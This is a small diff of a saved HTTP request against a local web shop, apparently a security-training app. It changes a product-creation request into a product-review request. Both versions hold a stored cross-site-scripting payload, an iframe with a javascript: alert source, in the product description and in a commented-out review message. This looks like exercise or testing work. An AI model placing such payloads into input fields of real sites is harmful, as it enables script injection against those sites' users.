@@ -1,4 +1,4 @@
-POST /api/Products/ HTTP/1.1
+PUT /rest/products/30/reviews HTTP/1.1
 Host: localhost:3000
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
 Accept: application/json, text/plain, */*
@@ -16,7 +16,7 @@ Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
 
 {
-      "name": "Dauerlutscher",
-      "description": "Lasts all-time. <iframe src=\"javascript:alert(`xss`)\">",
-      "price": 12.99
+    //"message":"I was here <iframe src=\"javascript:alert(`xss`)\">",
+    "message": "Trinke ich gerne",
+    "author":"dsc@ongoingmedia.de"
 }
